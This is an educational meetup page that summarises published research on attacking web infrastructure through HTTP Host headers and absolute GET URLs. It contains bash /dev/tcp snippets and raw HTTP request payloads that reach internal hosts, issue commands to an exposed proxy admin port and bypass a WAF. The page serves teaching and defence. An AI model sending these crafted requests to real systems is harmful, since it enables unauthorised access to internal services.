

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>11.31. 2017-08-05 Attacking via HTTP Headers &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="11. Pentest Presentations" href="../pentest_presentations.html"/>
        <link rel="next" title="11.32. MitM Presentation" href="mitm.html"/>
        <link rel="prev" title="11.30. 2017-08-19 Forcing HTTPS, HTTP forwarding" href="20170819_presentation.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="20180331_presentation.html">11.1. 2018-03-31 Links, TLS 1.3, and Cryptography</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180303_presentation.html">11.2. 2018-03-03 Links, Cloud VMs, OpenSSL, Metasploit Framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180224_presentation.html">11.3. 2018-02-24 Links, Cloud VMs, Let’s Encrypt, Metasploit Framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180217_presentation.html">11.4. 2018-02-17 Links, Web frontend, and Malware C2</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180210_presentation.html">11.5. 2018-02-10 Links, memory issues, and WAF</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180203_presentation.html">11.6. 2018-02-03 Links and more ROP</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180127_presentation.html">11.7. 2018-01-27 Links and ROP</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180120_presentation.html">11.8. 2018-01-20 Links and yet more Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180113_presentation.html">11.9. 2018-01-13 Links and more Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170812_presentation.html">11.10. 2017-08-12 VRT, cryptography, TLS 1.3, Broadpwn, cURL, and phishing</a></li>
<li class="toctree-l2"><a class="reference internal" href="20180106_presentation.html">11.11. 2018-01-06 Invisibly fingerprinting text, Samsung no-SOP, Meltdown/Spectre</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171230_presentation.html">11.12. 2017-12-30 gohttp, hardening C/C++, Linux waitid() exploit</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171223_presentation.html">11.13. 2017-12-23 Haven, Observatory, and Janus</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171216_presentation.html">11.14. 2017-12-16 Mozilla Observatory</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171209_presentation.html">11.15. 2017-12-09 Phone tracking, AWS leaks, macOS root, exim</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171202_presentation.html">11.16. 2017-12-02 Static websites, IME follow-up</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171125_presentation.html">11.17. 2017-11-25 Not getting hacked, keystrokes, tracking, Fancy Bear, Intel ME</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171118_presentation.html">11.18. 2017-11-18 Privacy, safe languages, Linux networking</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171111_presentation.html">11.19. 2017-11-11 PKP removal, exploits galore</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171104_presentation.html">11.20. 2017-11-04 Cloud providers other than AWS</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171028_presentation.html">11.21. 2017-10-28 IPv6 ULA, DHCPv6, /64 prefixes, Bad Rabbit</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171021_presentation.html">11.22. 2017-10-21 IPv6 addressing, KRACK, Infineon RSA</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171014_presentation.html">11.23. 2017-10-14 Firewalls, building vulnerable hosts</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171007_presentation.html">11.24. 2017-10-07 QEMU virtualization</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170930_presentation.html">11.25. 2017-09-30 virtualization and bridges</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170923_presentation.html">11.26. 2017-09-23 nftables</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170916_presentation.html">11.27. 2017-09-16 “VPN”</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170909_presentation.html">11.28. 2017-09-09 Adding IPv6 on the EdgeRouter Lite</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170826_presentation.html">11.29. 2017-08-26 Complexity, Cookies vs Tokens</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170819_presentation.html">11.30. 2017-08-19 Forcing HTTPS, HTTP forwarding</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">11.31. 2017-08-05 Attacking via HTTP Headers</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#modifying-http-header-fields">11.31.1. Modifying HTTP header fields</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#host-header">11.31.1.1. Host: header</a></li>
<li class="toctree-l4"><a class="reference internal" href="#get-request">11.31.1.2. GET request</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#making-invisible-systems-contact-us">11.31.2. Making invisible systems contact us</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#getting-access-to-hidden-servers">11.31.2.1. Getting access to hidden servers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tools">11.31.2.2. Tools</a></li>
<li class="toctree-l4"><a class="reference internal" href="#target-sites">11.31.2.3. Target sites</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#misrouting-requests">11.31.3. Misrouting requests</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#invalid-http-host-header">11.31.3.1. Invalid HTTP Host Header</a></li>
<li class="toctree-l4"><a class="reference internal" href="#uncovering-monitoring-why-https-is-important">11.31.3.2. Uncovering monitoring (why HTTPS is important)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#input-permutation">11.31.3.3. Input permutation</a></li>
<li class="toctree-l4"><a class="reference internal" href="#host-overriding">11.31.3.4. Host Overriding</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ambiguous-requests">11.31.3.5. Ambiguous requests</a></li>
<li class="toctree-l4"><a class="reference internal" href="#breaking-expectations">11.31.3.6. Breaking expectations</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tunnels-tor2web">11.31.3.7. Tunnels (Tor2web)</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#targeting-auxiliary-systems">11.31.4. Targeting auxiliary systems</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#getting-info-through-other-headers">11.31.4.1. Getting info through other headers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#remote-client-exploits">11.31.4.2. Remote Client Exploits</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pre-emptive-caching">11.31.4.3. Pre-emptive Caching</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="mitm.html">11.32. MitM Presentation</a></li>
</ul>
</li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_presentations.html">11. Pentest Presentations</a> &raquo;</li>
        
      <li>11.31. 2017-08-05 Attacking via HTTP Headers</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/presentations/http_headers.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="attacking-via-http-headers">
<h1>11.31. 2017-08-05 Attacking via HTTP Headers<a class="headerlink" href="#attacking-via-http-headers" title="Permalink to this headline">¶</a></h1>
<p>This presentation is based on <a class="reference external" href="http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html">Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface</a> from the blog of the <a class="reference external" href="http://portswigger.net/burp/">Burp Suite</a> tool.</p>
<p>You should assume that any quotes in this article are from the original presentation. Nothing here is original to the meetup group. We might emphasize (make bold) text to aid skimming through or presenting the material.</p>
<div class="section" id="modifying-http-header-fields">
<h2>11.31.1. Modifying HTTP header fields<a class="headerlink" href="#modifying-http-header-fields" title="Permalink to this headline">¶</a></h2>
<p>For an intro to HTTP header fields see <a class="reference internal" href="../html/http.html#http-headers"><span class="std std-ref">HTTP headers</span></a>. In this section the two most-discussed attacks focus on “Host:” header and the “GET” request itself.</p>
<div class="section" id="host-header">
<h3>11.31.1.1. Host: header<a class="headerlink" href="#host-header" title="Permalink to this headline">¶</a></h3>
<p>The HTTP “Host:” header field can be attacked by putting in a host not intended to be the HTTP destination server, or by adding unexpected characters that exploit parsing errors.</p>
<div class="section" id="improper-host">
<h4>11.31.1.1.1. Improper host<a class="headerlink" href="#improper-host" title="Permalink to this headline">¶</a></h4>
<p>The “Host:” header is supposed to be the target host name and optionally port given by the user as shown here:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@meetup:~$</span> curl -v http://www.example.com/index.html  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>  egrep  <span class="s1">&#39;^&gt; (GET |Host:)&#39;</span>
<span class="gp">&gt;</span> GET /index.html HTTP/1.1
<span class="gp">&gt;</span> Host: www.example.com
</pre></div>
</div>
<p>The request “<a class="reference external" href="http://www.example.com/index.html">http://www.example.com/index.html</a>” was split into “GET /index.html HTTP/1.1” and “Host: www.example.com”.</p>
<p>But what if “Host:” were manipulated to an unexpected host and a reverse proxy did not properly whitelist the “Host:” header field? Then the request could go to either an internal server possibly not intended to receive Internet traffic, or provide a “pingback” to an external host providing information to further attack an internal host.</p>
<p>Here’s an example where the “Host:” header field is followed:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>
<span class="hll"><span class="nb">exec</span> <span class="m">9</span>&lt;&gt;/dev/tcp/ktla.com/80  <span class="c1"># open tcp port 80 to/from ktla.com</span>
</span><span class="c1"># Make a web request</span>
<span class="hll"><span class="nb">echo</span> -ne <span class="s2">&quot;GET / HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">9</span>
</span><span class="c1"># Get the response</span>
cat &lt;<span class="p">&amp;</span><span class="m">9</span>
<span class="o">)</span>
</pre></div>
</div>
<p>Here’s an example with the hosts in the previous example switched, where the “Host:” header field is properly screened and results in an HTTP 404 “Not Found” error:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>
<span class="hll"><span class="nb">exec</span> <span class="m">9</span>&lt;&gt;/dev/tcp/www.example.com/80  <span class="c1"># open tcp port 80 to/from www.example.com</span>
</span><span class="c1"># Make a web request</span>
<span class="hll"><span class="nb">echo</span> -ne <span class="s2">&quot;GET / HTTP/1.1\r\nHost: ktla.com\r\nConnection: close\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">9</span>
</span><span class="c1"># Get the response</span>
cat &lt;<span class="p">&amp;</span><span class="m">9</span>
<span class="o">)</span>
</pre></div>
</div>
<p>Note that name-based virtual hosting depends on the HTTP “Host:” header field to differentiate the target web servers. The legal values would depend on the current set of virtual hosts sharing the IP, and that set can change frequently.</p>
</div>
<div class="section" id="unexpected-characters">
<h4>11.31.1.1.2. Unexpected characters<a class="headerlink" href="#unexpected-characters" title="Permalink to this headline">¶</a></h4>
<p>Additionally, consider if extra characters were added to “Host:”, like “&#64;”? In one of the exploits “&#64;” was treated as a separator between a userid and password.</p>
</div>
</div>
<div class="section" id="get-request">
<h3>11.31.1.2. GET request<a class="headerlink" href="#get-request" title="Permalink to this headline">¶</a></h3>
<p>Similarly, what if the GET request were modified to provide a FQDN as opposed to a relative reference “/…”? The results could be similar to an attack using the “Host:” header:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>
<span class="hll"><span class="nb">exec</span> <span class="m">9</span>&lt;&gt;/dev/tcp/ktla.com/80  <span class="c1"># open tcp port 80 to/from ktla.com</span>
</span><span class="c1"># Make a web request</span>
<span class="hll"><span class="nb">echo</span> -ne <span class="s2">&quot;GET http://www.example.com/index.html HTTP/1.1\r\nHost: ktla.com\r\nConnection: close\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">9</span>
</span><span class="c1"># Get the response</span>
cat &lt;<span class="p">&amp;</span><span class="m">9</span>
<span class="o">)</span>
</pre></div>
</div>
<p>Here’s an example with the hosts in the previous example switched, where the “GET” request is properly screened and results in an HTTP 400 “Bad Request” error:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>
<span class="hll"><span class="nb">exec</span> <span class="m">9</span>&lt;&gt;/dev/tcp/www.example.com/80  <span class="c1"># open tcp port 80 to/from www.example.com</span>
</span><span class="c1"># Make a web request</span>
<span class="hll"><span class="nb">echo</span> -ne <span class="s2">&quot;GET http://ktla.com/index.html HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">9</span>
</span><span class="c1"># Get the response</span>
cat &lt;<span class="p">&amp;</span><span class="m">9</span>
<span class="o">)</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="making-invisible-systems-contact-us">
<h2>11.31.2. Making invisible systems contact us<a class="headerlink" href="#making-invisible-systems-contact-us" title="Permalink to this headline">¶</a></h2>
<div class="section" id="getting-access-to-hidden-servers">
<h3>11.31.2.1. Getting access to hidden servers<a class="headerlink" href="#getting-access-to-hidden-servers" title="Permalink to this headline">¶</a></h3>
<p>HTTP headers can be used to unmask hidden, non-public servers. The idea is that if the “Host:” HTTP headers is set to someplace.else.com instead of expected.server.com, then the request may be sent to someplace.else.com and it may actually respond. That response is called a “pingback” and can be the start of an exploit.</p>
</div>
<div class="section" id="tools">
<h3>11.31.2.2. Tools<a class="headerlink" href="#tools" title="Permalink to this headline">¶</a></h3>
<div class="section" id="burp-collaborator-canarytokens">
<h4>11.31.2.2.1. Burp Collaborator, Canarytokens<a class="headerlink" href="#burp-collaborator-canarytokens" title="Permalink to this headline">¶</a></h4>
<p>Invisible systems like load balancers can be unmasked with carefully crafted payloads resulting in a “pingback”: network traffic (DNS, HTTP) to our servers.</p>
<p>To determine when such contact occurs the author used their product <a class="reference external" href="https://portswigger.net/burp/help/collaborator.html">Burp Collaborator</a>, but also pointed out the open source <a class="reference external" href="https://canarytokens.org/generate">Canarytokens</a>.</p>
<p>See <a class="reference external" href="http://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html">Canarytokens.org - Quick, Free, Detection for the Masses</a> for a description of Canarytokens.</p>
<p>For a basic introduction to the problem of detecting pingbacks see <a class="reference external" href="http://blog.portswigger.net/2015/04/introducing-burp-collaborator.html">Introducing Burp Collaborator</a>. Basically, Burp Collaborator runs a server with DNS that can detect external DNS &amp; web requests from a target.</p>
</div>
<div class="section" id="collaborator-everywhere">
<h4>11.31.2.2.2. Collaborator Everywhere<a class="headerlink" href="#collaborator-everywhere" title="Permalink to this headline">¶</a></h4>
<p>The author also wrote the Burp extension <a class="reference external" href="https://github.com/PortSwigger/collaborator-everywhere">Collaborator Everywhere</a> to inject “payloads containing unique identifiers into all proxied traffic, and uses these to automatically correlate pingbacks with the corresponding attacks.” An example of it’s usage is Netflix “visited the URL specified in the Referer header four hours after my visit to their site, and is pretending to be an iPhone running on an x86 CPU”.</p>
</div>
<div class="section" id="zmap-zgrab">
<h4>11.31.2.2.3. ZMap/ZGrab<a class="headerlink" href="#zmap-zgrab" title="Permalink to this headline">¶</a></h4>
<p>The author initially used <a class="reference external" href="https://github.com/robertdavidgraham/masscan">Masscan</a> but switched to <a class="reference external" href="https://github.com/zmap/zgrab">Zmap/Zgrab</a>.</p>
</div>
<div class="section" id="burp-suite-mitmproxy-ncat-openssl">
<h4>11.31.2.2.4. Burp Suite, mitmproxy, Ncat/OpenSSL<a class="headerlink" href="#burp-suite-mitmproxy-ncat-openssl" title="Permalink to this headline">¶</a></h4>
<p>Besides Burp Suite, the author recommended <a class="reference external" href="https://mitmproxy.org/">mitmproxy</a> and Ncat/OpenSSL. <code class="docutils literal notranslate"><span class="pre">socat</span></code> can also be used in lieu of Ncat/OpenSSL.</p>
</div>
</div>
<div class="section" id="target-sites">
<h3>11.31.2.3. Target sites<a class="headerlink" href="#target-sites" title="Permalink to this headline">¶</a></h3>
<p>In order to be legal “Target domains and IP addresses were obtained by manually building a list of legally testable domains from public and private bug bounty programs, and mapping this against <a class="reference external" href="https://scans.io/study/sonar.fdns_v2">Rapid7’s Project Sonar Forward DNS database</a>”. That led to 50k potential web server targets. “To maximize coverage I used up to five hostnames per IP, used both HTTP and HTTPS, and also tried to trigger edge cases using X-Forwarded-Proto: HTTPS and Max-Forwards. I also sent the Cache-Control: no-transform header to discourage intermediate servers from mangling my payloads”.</p>
</div>
</div>
<div class="section" id="misrouting-requests">
<h2>11.31.3. Misrouting requests<a class="headerlink" href="#misrouting-requests" title="Permalink to this headline">¶</a></h2>
<p>The examples below assume you are using Burp Collaborator and therefore the external website burpcollaborator.net.</p>
<div class="section" id="invalid-http-host-header">
<h3>11.31.3.1. Invalid HTTP Host Header<a class="headerlink" href="#invalid-http-host-header" title="Permalink to this headline">¶</a></h3>
<p>The first exploit uses an incorrect HTTP Host header and was used to “exploit 27 DoD servers, my ISP, a Columbian ISP that threw itself in the firing line using DNS poisoning, and <a class="reference external" href="http://ats-vm.lorax.bf1.yahoo.com/">http://ats-vm.lorax.bf1.yahoo.com/</a> “.</p>
<p>Here is the attack against <a class="reference external" href="http://ats-vm.lorax.bf1.yahoo.com/">http://ats-vm.lorax.bf1.yahoo.com/</a> (replacing the original “GET” with “HELP”)</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span class="hll">HELP / HTTP/1.1
</span><span class="hll">Host: XX.X.XXX.XX:8082
</span>

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:33:59 GMT
Transfer-Encoding: chunked
Connection: keep-alive

Ok

<span class="hll">  Traffic Server Overseer Port
</span>
<span class="hll">  commands:
</span><span class="hll">    get &lt;variable-list&gt;
</span><span class="hll">    set &lt;variable-name&gt; = &quot;&lt;value&gt;&quot;
</span>    help
    exit

  example:

    Ok
    get proxy.node.cache.contents.bytes_free
    proxy.node.cache.contents.bytes_free = &quot;56616048&quot;
    Ok

  Variable lists are conf/yts/stats records, separated by commas

Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
</pre></div>
</div>
<p>The line “Traffic Server Overseer Port” tells us that this is <a class="reference external" href="https://github.com/pquerna/trafficserver">Apache Traffic Server</a> with documentation at <a class="reference external" href="https://docs.trafficserver.apache.org/en/latest/index.html">Apache Traffic Server Manual</a>. The extra “Unknown Command” lines are probably due to the Apache Traffic Server using “\n’ line endings.</p>
<p>The exploit consisted of sending Apache Traffic Server configuration commands, starting with setting <a class="reference external" href="https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html?highlight=alarm_email#alarm-configuration">proxy.config.alarm_email</a> (demonstrating that “Using the SET command, I could have made wide-ranging configuration changes to Yahoo’s pool of load balancers, including enabling SOCKS proxying and granting my IP address permission to directly push items into their cache.”):</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="hll"><span class="na">Host</span><span class="o">:</span> <span class="l">XX.X.XXX.XX:8082</span>
</span><span class="na">Content-Length</span><span class="o">:</span> <span class="l">34</span>

<span class="hll">GET proxy.config.alarm_email
</span>

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep-alive

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
<span class="hll">proxy.config.alarm_email = &quot;nobody@yahoo-inc.com&quot;
</span></pre></div>
</div>
</div>
<div class="section" id="uncovering-monitoring-why-https-is-important">
<h3>11.31.3.2. Uncovering monitoring (why HTTPS is important)<a class="headerlink" href="#uncovering-monitoring-why-https-is-important" title="Permalink to this headline">¶</a></h3>
<div class="section" id="british-telecom-spying">
<h4>11.31.3.2.1. British Telecom spying<a class="headerlink" href="#british-telecom-spying" title="Permalink to this headline">¶</a></h4>
<p>The author discovered that ISPs (presumably with government sponsorship) are intercepting HTTP (but not HTTPS) by DNS redirection. cloud.mail.ru was in that list. From the original article:</p>
<blockquote>
<div>To discern the system’s true purpose, I used Masscan to ping TCP port 80 across the entire IPv4 address space using a TTL of 10 - effectively a whole internet traceroute. After filtering out caches and self-hosted websites, I had a complete list of targeted IP addresses. Sampling this list revealed that the system was primarily being used to block access to copyrighted content. Traffic to blacklisted IP addresses was being rerouted into the pool of proxies so that they could inspect the HTTP host header being used, and potentially block the request with a message I’m sure none of our upstanding UK readership is familiar with:</div></blockquote>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="hll"><span class="na">Host</span><span class="o">:</span> <span class="l">www.icefilms.info</span>
</span>
HTTP/1.1 200 OK
<span class="hll">...
</span><span class="hll">&lt;p&gt;Access to the websites listed on this page has been blocked pursuant to orders of the high court.&lt;/p&gt;
</span></pre></div>
</div>
<p>Continuing on in the article:</p>
<blockquote>
<div><p>This setup has several notable consequences. Thanks to virtual hosting, cloud hosts like Google Sites have ended up on the blacklist, meaning all traffic to them from consumer and corporate BT users is proxied. From a blacklisted server’s point of view, all BT users share the same tiny pool of IP addresses. This has resulted in BT’s proxy’s IPs landing on abuse blacklists and being banned from a number of websites, affecting all BT users. Also, if I had used the aforementioned admin access vulnerability to compromise the proxy’s administration panels, I could could potentially reconfigure the proxies to inject content into the traffic of millions of BT customers. Finally, this highlights just how easily overlooked such vulnerabilities are; for years I and many other British pentesters have been hacking through an exploitable proxy without even noticing it existed.</p>
<p>I reported the ability to access the internal admin panel to a personal contact at BT, who ensured it was quickly resolved. They also shared that the interception system was originally constructed as part of CleanFeed, a government initiative to block access to images of child abuse. However, it was inevitably repurposed to target copyright abuse.</p>
</div></blockquote>
</div>
<div class="section" id="columbia-s-metrotel-spying">
<h4>11.31.3.2.2. Columbia’s METROTEL spying<a class="headerlink" href="#columbia-s-metrotel-spying" title="Permalink to this headline">¶</a></h4>
<p>From the original article:</p>
<blockquote>
<div><p>Rapid7’s Project Sonar had used a public METROTEL DNS server which was selectively poisoning results for certain domains in order to redirect traffic into its proxy for DPI. To pass through HTTPS traffic without causing certificate errors they sniffed the intended remote host from the Server-Name Indicator (SNI) field. I notified Rapid7 who identified the misbehaving DNS server, meaning I could feed the Alexa top 1 million domain list into it and identify targeted hosts. It appeared to be targeting various image and video hosts, and also some lesser known social networks. Attempting to visit these resulted in a redirect to <a class="reference external" href="http://internetsano.metrotel.net.co/">http://internetsano.metrotel.net.co/</a>, stating that the site was blocked for containing images of child abuse.</p>
<p>As with BT, the original intention of this system may be commendable but there was evidence it had been repurposed. In addition to targeting image hosting sites, the DNS server also poisoned lookups to certain news websites including bbc.co.uk. This is presumably to block or tamper with certain news articles, though I haven’t yet identified which articles are being targeted.</p>
</div></blockquote>
</div>
</div>
<div class="section" id="input-permutation">
<h3>11.31.3.3. Input permutation<a class="headerlink" href="#input-permutation" title="Permalink to this headline">¶</a></h3>
<p>For some hosts an HTTP request like:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="hll"><span class="na">Host</span><span class="o">:</span> <span class="l">burpcollaborator.net</span>
</span><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
<p>Would generate the following request:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/burpcollaborator.net/burpcollaborator.net</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="hll"><span class="na">Host</span><span class="o">:</span> <span class="l">outage.burpcollaborator.net</span>
</span><span class="na">Via</span><span class="o">:</span> <span class="l">o2-b.ycpi.tp2.yahoo.net</span>
</pre></div>
</div>
<p>This invites creating a DNS record for “outage.yourdomain.com” mapping to an internal address in someone else’s infrastructure. But in the following case that wasn’t necessary, as the whole domain vcap.me (including <code class="docutils literal notranslate"><span class="pre">dig</span> <span class="pre">+short</span> <span class="pre">outage.vcap.me</span></code>) resolves to 127.0.0.1:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="hll"><span class="na">Host</span><span class="o">:</span> <span class="l">./?x=.vcap.me</span>
</span><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
<p>will lead to:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /vcap.me/../?=x=.vcap.me
<span class="hll">Host: outage.vcap.me
</span>Via: o2-b.ycpi.tp2.yahoo.net
</pre></div>
</div>
<p>This references the internal machine via “<a class="reference external" href="http://127.0.0.1/">http://127.0.0.1/</a>” and earned the article’s author a bug bounty.</p>
</div>
<div class="section" id="host-overriding">
<h3>11.31.3.4. Host Overriding<a class="headerlink" href="#host-overriding" title="Permalink to this headline">¶</a></h3>
<p>Some servers restrict overriding the “Host:” header but fail to check the “GET” command, so the following did work on some US DoD servers:</p>
<div class="highlight-http notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nf">GET</span> <span class="nn">http://internal-website.mil/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Host</span><span class="o">:</span> <span class="l">xxxxxxx.mil</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</div>
</div>
<div class="section" id="ambiguous-requests">
<h3>11.31.3.5. Ambiguous requests<a class="headerlink" href="#ambiguous-requests" title="Permalink to this headline">¶</a></h3>
<p>Incapsula’s cloud-based Web Application Firewall incorrectly parsed the “Host:” header <code class="docutils literal notranslate"><span class="pre">Host:</span> <span class="pre">incapsula-client.net:80&#64;burp-collaborator.net</span></code> by authenticating to the burp-collaborator.net with username ‘incapsula-client.net’ and password ‘80’. “It revealed the location of the backend server, enabling me to bypass Incapsula’s protection by accessing the backend directly.”</p>
